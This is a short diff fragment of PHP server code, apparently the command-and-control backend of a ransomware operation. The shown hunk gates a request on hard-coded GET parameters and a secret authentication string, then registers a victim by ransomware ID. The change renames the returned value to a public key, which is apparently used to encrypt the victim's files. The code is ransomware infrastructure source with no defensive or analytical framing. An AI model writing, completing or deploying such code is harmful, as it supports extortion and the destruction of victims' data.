@@ -13,8 +13,8 @@ if(isset($_GET['if_i_look_back_i_m_lost'])&&isset($_GET['winter_is_coming'])&&is
 
         #Adding a victim using Ransomware ID	
 		if($auth_result==="you_are_your_mothers_trueborn_son_of_lannister"){
-				$assoc_result=add_victim($ransomware_id, $values);
-				echo $assoc_result;
+				$pubkey=add_victim($ransomware_id, $values);
+				echo $pubkey;
 				}
 }
 else{
